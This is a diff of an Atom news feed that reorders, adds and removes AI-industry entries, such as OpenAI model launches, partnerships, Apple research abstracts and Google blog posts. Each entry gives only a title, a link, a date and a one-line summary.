extra legs. In the &quot;high&quot; row, nano shows multiple small pelicans crowded around a broken green bicycle on grass with a sun overhead, mini shows a tandem bicycle with two white pelicans and clear blue sky, and gpt-5.4 shows two pelicans stacked on a red tandem bike with the most realistic proportions yet. In the &quot;xhigh&quot; row, nano shows the most detailed scene with a pelican on a detailed bicycle with grass and a large sun but still somewhat jumbled anatomy, mini produces the cleanest single pelican on a yellow-accented bicycle with a light blue sky, and gpt-5.4 shows a well-rendered gray pelican on a teal bicycle with the best overall coherence. Generally, quality improves moving right across models and down through quality tiers, though &quot;medium&quot; is inconsistently worse than &quot;low&quot; for some models, and all images maintain a lighthearted cartoon style with pastel skies and simple backgrounds." style="max-width: 100%;" /></p>
-    
-        <p>Tags: <a href="https://simonwillison.net/tags/ai">ai</a>, <a href="https://simonwillison.net/tags/openai">openai</a>, <a href="https://simonwillison.net/tags/generative-ai">generative-ai</a>, <a href="https://simonwillison.net/tags/llms">llms</a>, <a href="https://simonwillison.net/tags/llm">llm</a>, <a href="https://simonwillison.net/tags/vision-llms">vision-llms</a>, <a href="https://simonwillison.net/tags/llm-pricing">llm-pricing</a>, <a href="https://simonwillison.net/tags/pelican-riding-a-bicycle">pelican-riding-a-bicycle</a>, <a href="https://simonwillison.net/tags/llm-release">llm-release</a></p>]]></summary>
-        <author>
-            <name>Simon Willison's Weblog</name>
         </author>
     </entry>
     <entry>
@@ -1185,21 +1238,21 @@ PromptArmor report on a prompt injection attack chain in Snowflake's <a href="ht
         </author>
     </entry>
     <entry>
-        <title type="html"><![CDATA[Introducing GPT-5.4 mini and nano]]></title>
-        <id>https://openai.com/index/introducing-gpt-5-4-mini-and-nano</id>
-        <link href="https://openai.com/index/introducing-gpt-5-4-mini-and-nano"/>
-        <updated>2026-03-17T10:00:00.000Z</updated>
-        <summary type="html"><![CDATA[GPT-5.4 mini and nano are smaller, faster versions of GPT-5.4 optimized for coding, tool use, multimodal reasoning, and high-volume API and sub-agent workloads.]]></summary>
-        <author>
-            <name>OpenAI News</name>
-        </author>
-    </entry>
-    <entry>
         <title type="html"><![CDATA[OpenAI Japan announces Japan Teen Safety Blueprint to put teen safety first]]></title>
         <id>https://openai.com/index/japan-teen-safety-blueprint</id>
         <link href="https://openai.com/index/japan-teen-safety-blueprint"/>
         <updated>2026-03-17T10:00:00.000Z</updated>
         <summary type="html"><![CDATA[OpenAI Japan announces the Japan Teen Safety Blueprint, introducing stronger age protections, parental controls, and well-being safeguards for teens using generative AI.]]></summary>
+        <author>
+            <name>OpenAI News</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Introducing GPT-5.4 mini and nano]]></title>
+        <id>https://openai.com/index/introducing-gpt-5-4-mini-and-nano</id>
+        <link href="https://openai.com/index/introducing-gpt-5-4-mini-and-nano"/>
+        <updated>2026-03-17T10:00:00.000Z</updated>
+        <summary type="html"><![CDATA[GPT-5.4 mini and nano are smaller, faster versions of GPT-5.4 optimized for coding, tool use, multimodal reasoning, and high-volume API and sub-agent workloads.]]></summary>
         <author>
             <name>OpenAI News</name>
         </author>
@@ -1221,26 +1274,6 @@ PromptArmor report on a prompt injection attack chain in Snowflake's <a href="ht
         <summary type="html"><![CDATA[New research shows Americans send nearly 3 million daily messages to ChatGPT asking about compensation and earnings, helping close the wage information gap.]]></summary>
         <author>
             <name>OpenAI News</name>
-        </author>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[TrajTok: Learning Trajectory Tokens enables better Video Understanding]]></title>
-        <id>trajtok</id>
-        <link href="https://machinelearning.apple.com/research/trajtok"/>
-        <updated>2026-03-17T00:00:00.000Z</updated>
-        <summary type="html"><![CDATA[Tokenization in video models, typically through patchification, generates an excessive and redundant number of tokens. This severely limits video efficiency and scalability. While recent trajectory-based tokenizers offer a promising solution by decoupling video duration from token count, they rely on complex external segmentation and tracking pipelines that are slow and task-agnostic. We propose TrajTok, an end-to-end video tokenizer module that is fully integrated and co-trained with video models for a downstream objective, dynamically adapting its token granularity to semantic complexity…]]></summary>
-        <author>
-            <name>Apple Machine Learning Research</name>
-        </author>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[AMES: Approximate Multi-modal Enterprise Search via Late Interaction Retrieval]]></title>
-        <id>ames</id>
-        <link href="https://machinelearning.apple.com/research/ames"/>
-        <updated>2026-03-17T00:00:00.000Z</updated>
-        <summary type="html"><![CDATA[We present AMES (Approximate Multimodal Enterprise Search), a unified multimodal late interaction retrieval architecture which is backend agnostic. AMES demonstrates that fine-grained multimodal late interaction retrieval can be deployed within a production grade enterprise search engine without architectural redesign. Text tokens, image patches, and video frames are embedded into a shared representation space using multi-vector encoders, enabling cross-modal retrieval without modality specific retrieval logic. AMES employs a two-stage pipeline: parallel token level ANN search with per…]]></summary>
-        <author>
-            <name>Apple Machine Learning Research</name>
         </author>
     </entry>
     <entry>
@@ -1382,6 +1415,16 @@ PromptArmor report on a prompt injection attack chain in Snowflake's <a href="ht
         </author>
     </entry>
     <entry>
+        <title type="html"><![CDATA[Wayfair boosts catalog accuracy and support speed with OpenAI]]></title>
+        <id>https://openai.com/index/wayfair</id>
+        <link href="https://openai.com/index/wayfair"/>
+        <updated>2026-03-11T00:00:00.000Z</updated>
+        <summary type="html"><![CDATA[Wayfair uses OpenAI models to improve ecommerce support and product catalog accuracy, automating ticket triage and enhancing millions of product attributes at scale.]]></summary>
+        <author>
+            <name>OpenAI News</name>
+        </author>
+    </entry>
+    <entry>
         <title type="html"><![CDATA[How we compare model quality in Cursor]]></title>
         <id>https://cursor.com/blog/cursorbench</id>
         <link href="https://cursor.com/blog/cursorbench"/>
@@ -1500,16 +1543,6 @@ PromptArmor report on a prompt injection attack chain in Snowflake's <a href="ht
         </author>
     </entry>
     <entry>
-        <title type="html"><![CDATA[New Google AI Model: Hype or Actually Good?]]></title>
-        <id>https://www.youtube.com/shorts/dEH17qq7wJQ</id>
-        <link href="https://www.youtube.com/shorts/dEH17qq7wJQ"/>
-        <updated>2026-03-08T13:27:21.000Z</updated>
-        <summary type="html"><![CDATA[Enjoy the videos and music you love, upload original content, and share it all with friends, family, and the world on YouTube.]]></summary>
-        <author>
-            <name>Matt Wolfe</name>
-        </author>
-    </entry>
-    <entry>
         <title type="html"><![CDATA[How our open-source AI model SpeciesNet is helping to promote wildlife conservation]]></title>
         <id>https://blog.google/company-news/outreach-and-initiatives/sustainability/speciesnet-open-source-ai-wildlife/</id>
         <link href="https://blog.google/company-news/outreach-and-initiatives/sustainability/speciesnet-open-source-ai-wildlife/"/>
@@ -1589,20 +1622,20 @@ PromptArmor report on a prompt injection attack chain in Snowflake's <a href="ht
         </author>
     </entry>
     <entry>
-        <title type="html"><![CDATA[Reasoning models struggle to control their chains of thought, and that’s good]]></title>
-        <id>https://openai.com/index/reasoning-models-chain-of-thought-controllability</id>
-        <link href="https://openai.com/index/reasoning-models-chain-of-thought-controllability"/>
+        <title type="html"><![CDATA[GPT-5.4 Thinking System Card]]></title>
+        <id>https://openai.com/index/gpt-5-4-thinking-system-card</id>
+        <link href="https://openai.com/index/gpt-5-4-thinking-system-card"/>
         <updated>2026-03-05T10:00:00.000Z</updated>
-        <summary type="html"><![CDATA[OpenAI introduces CoT-Control and finds reasoning models struggle to control their chains of thought, reinforcing monitorability as an AI safety safeguard.]]></summary>
         <author>
             <name>OpenAI News</name>
         </author>
     </entry>
     <entry>
-        <title type="html"><![CDATA[GPT-5.4 Thinking System Card]]></title>
-        <id>https://openai.com/index/gpt-5-4-thinking-system-card</id>
-        <link href="https://openai.com/index/gpt-5-4-thinking-system-card"/>
+        <title type="html"><![CDATA[Reasoning models struggle to control their chains of thought, and that’s good]]></title>
+        <id>https://openai.com/index/reasoning-models-chain-of-thought-controllability</id>
+        <link href="https://openai.com/index/reasoning-models-chain-of-thought-controllability"/>
         <updated>2026-03-05T10:00:00.000Z</updated>
+        <summary type="html"><![CDATA[OpenAI introduces CoT-Control and finds reasoning models struggle to control their chains of thought, reinforcing monitorability as an AI safety safeguard.]]></summary>
         <author>
             <name>OpenAI News</name>
         </author>
@@ -1628,11 +1661,11 @@ PromptArmor report on a prompt injection attack chain in Snowflake's <a href="ht
         </author>
     </entry>
     <entry>
-        <title type="html"><![CDATA[The five AI value models driving business reinvention]]></title>
-        <id>https://openai.com/index/the-five-ai-value-models-driving-business-reinvention</id>
-        <link href="https://openai.com/index/the-five-ai-value-models-driving-business-reinvention"/>
+        <title type="html"><![CDATA[VfL Wolfsburg turns ChatGPT into a club-wide capability]]></title>
+        <id>https://openai.com/index/vfl-wolfsburg</id>
+        <link href="https://openai.com/index/vfl-wolfsburg"/>
         <updated>2026-03-05T00:00:00.000Z</updated>
-        <summary type="html"><![CDATA[Five AI value models show how leaders can sequence AI from workforce fluency to process reinvention and build durable business advantage.]]></summary>
+        <summary type="html"><![CDATA[By focusing on people, not pilots, the Bundesliga club is scaling efficiency, creativity, and knowledge—without losing its football identity.]]></summary>
         <author>
             <name>OpenAI News</name>
         </author>
@@ -1643,6 +1676,16 @@ PromptArmor report on a prompt injection attack chain in Snowflake's <a href="ht
         <link href="https://openai.com/index/chatgpt-for-excel"/>
         <updated>2026-03-05T00:00:00.000Z</updated>
         <summary type="html"><![CDATA[OpenAI introduces ChatGPT for Excel and new financial app integrations, powered by GPT-5.4 to accelerate modeling, research, and analysis in regulated environments.]]></summary>
+        <author>
+            <name>OpenAI News</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[The five AI value models driving business reinvention]]></title>
+        <id>https://openai.com/index/the-five-ai-value-models-driving-business-reinvention</id>
+        <link href="https://openai.com/index/the-five-ai-value-models-driving-business-reinvention"/>
+        <updated>2026-03-05T00:00:00.000Z</updated>
+        <summary type="html"><![CDATA[Five AI value models show how leaders can sequence AI from workforce fluency to process reinvention and build durable business advantage.]]></summary>
         <author>
             <name>OpenAI News</name>
         </author>
@@ -1688,21 +1731,21 @@ PromptArmor report on a prompt injection attack chain in Snowflake's <a href="ht
         </author>
     </entry>
     <entry>
-        <title type="html"><![CDATA[Understanding AI and learning outcomes]]></title>
-        <id>https://openai.com/index/understanding-ai-and-learning-outcomes</id>
-        <link href="https://openai.com/index/understanding-ai-and-learning-outcomes"/>
-        <updated>2026-03-04T00:00:00.000Z</updated>
-        <summary type="html"><![CDATA[OpenAI introduces the Learning Outcomes Measurement Suite to assess AI’s impact on student learning across diverse educational environments over time.]]></summary>
-        <author>
-            <name>OpenAI News</name>
-        </author>
-    </entry>
-    <entry>
         <title type="html"><![CDATA[How Axios uses AI to help deliver high-impact local journalism]]></title>
         <id>https://openai.com/index/axios-allison-murphy</id>
         <link href="https://openai.com/index/axios-allison-murphy"/>
         <updated>2026-03-04T00:00:00.000Z</updated>
         <summary type="html"><![CDATA[Axios COO Allison Murphy explains how the company uses AI to support local reporters, streamline newsroom workflows, and deliver high-impact local journalism at scale.]]></summary>
+        <author>
+            <name>OpenAI News</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Understanding AI and learning outcomes]]></title>
+        <id>https://openai.com/index/understanding-ai-and-learning-outcomes</id>
+        <link href="https://openai.com/index/understanding-ai-and-learning-outcomes"/>
+        <updated>2026-03-04T00:00:00.000Z</updated>
+        <summary type="html"><![CDATA[OpenAI introduces the Learning Outcomes Measurement Suite to assess AI’s impact on student learning across diverse educational environments over time.]]></summary>
         <author>
             <name>OpenAI News</name>
         </author>
@@ -1834,11 +1877,11 @@ PromptArmor report on a prompt injection attack chain in Snowflake's <a href="ht
         </author>
     </entry>
     <entry>
-        <title type="html"><![CDATA[OpenAI and Amazon announce strategic partnership]]></title>
-        <id>https://openai.com/index/amazon-partnership</id>
-        <link href="https://openai.com/index/amazon-partnership"/>
+        <title type="html"><![CDATA[Scaling AI for everyone]]></title>
+        <id>https://openai.com/index/scaling-ai-for-everyone</id>
+        <link href="https://openai.com/index/scaling-ai-for-everyone"/>
         <updated>2026-02-27T05:30:00.000Z</updated>
-        <summary type="html"><![CDATA[OpenAI and Amazon announce a strategic partnership bringing OpenAI’s Frontier platform to AWS, expanding AI infrastructure, custom models, and enterprise AI agents.]]></summary>
+        <summary type="html"><![CDATA[Today we’re announcing $110B in new investment at a $730B pre money valuation. This includes $30B from SoftBank, $30B from NVIDIA, and $50B from Amazon.]]></summary>
         <author>
             <name>OpenAI News</name>
         </author>
@@ -1854,21 +1897,21 @@ PromptArmor report on a prompt injection attack chain in Snowflake's <a href="ht
         </author>
     </entry>
     <entry>
-        <title type="html"><![CDATA[Scaling AI for everyone]]></title>
-        <id>https://openai.com/index/scaling-ai-for-everyone</id>
-        <link href="https://openai.com/index/scaling-ai-for-everyone"/>
-        <updated>2026-02-27T05:30:00.000Z</updated>
-        <summary type="html"><![CDATA[Today we’re announcing $110B in new investment at a $730B pre money valuation. This includes $30B from SoftBank, $30B from NVIDIA, and $50B from Amazon.]]></summary>
-        <author>
-            <name>OpenAI News</name>
-        </author>
-    </entry>
-    <entry>
         <title type="html"><![CDATA[Introducing the Stateful Runtime Environment for Agents in Amazon Bedrock]]></title>
         <id>https://openai.com/index/introducing-the-stateful-runtime-environment-for-agents-in-amazon-bedrock</id>
         <link href="https://openai.com/index/introducing-the-stateful-runtime-environment-for-agents-in-amazon-bedrock"/>
         <updated>2026-02-27T05:30:00.000Z</updated>
         <summary type="html"><![CDATA[Stateful Runtime for Agents in Amazon Bedrock brings persistent orchestration, memory, and secure execution to multi-step AI workflows powered by OpenAI.]]></summary>
+        <author>
+            <name>OpenAI News</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[OpenAI and Amazon announce strategic partnership]]></title>
+        <id>https://openai.com/index/amazon-partnership</id>
+        <link href="https://openai.com/index/amazon-partnership"/>
+        <updated>2026-02-27T05:30:00.000Z</updated>
+        <summary type="html"><![CDATA[OpenAI and Amazon announce a strategic partnership bringing OpenAI’s Frontier platform to AWS, expanding AI infrastructure, custom models, and enterprise AI agents.]]></summary>
         <author>
             <name>OpenAI News</name>
         </author>
@@ -1990,36 +2033,6 @@ PromptArmor report on a prompt injection attack chain in Snowflake's <a href="ht
         <summary type="html"><![CDATA[Feb 26, 2026]]></summary>
         <author>
             <name>Cursor Changelog</name>
-        </author>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[See the whole picture and find the look with Circle to Search]]></title>
-        <id>https://blog.google/products-and-platforms/products/search/circle-to-search-february-2026/</id>
-        <link href="https://blog.google/products-and-platforms/products/search/circle-to-search-february-2026/"/>
-        <updated>2026-02-25T18:00:00.000Z</updated>
-        <summary type="html"><![CDATA[We’ve updated Circle to Search so you can now explore multiple items in a single image.]]></summary>
-        <author>
-            <name>AI</name>
-        </author>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[A more intelligent Android on Samsung Galaxy S26]]></title>
-        <id>https://blog.google/products-and-platforms/platforms/android/samsung-unpacked-2026/</id>
-        <link href="https://blog.google/products-and-platforms/platforms/android/samsung-unpacked-2026/"/>
-        <updated>2026-02-25T18:00:00.000Z</updated>
-        <summary type="html"><![CDATA[At Samsung Unpacked 2026, we showcased how Samsung Galaxy S26 devices are getting the latest in Android’s AI features.]]></summary>
-        <author>
-            <name>AI</name>
-        </author>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[Disrupting malicious uses of AI | February 2026]]></title>
-        <id>https://openai.com/index/disrupting-malicious-ai-uses</id>
-        <link href="https://openai.com/index/disrupting-malicious-ai-uses"/>
-        <updated>2026-02-25T00:00:00.000Z</updated>
-        <summary type="html"><![CDATA[Our latest threat report examines how malicious actors combine AI models with websites and social platforms—and what it means for detection and defense.]]></summary>
-        <author>
-            <name>OpenAI News</name>
         </author>
     </entry>
 </feed>
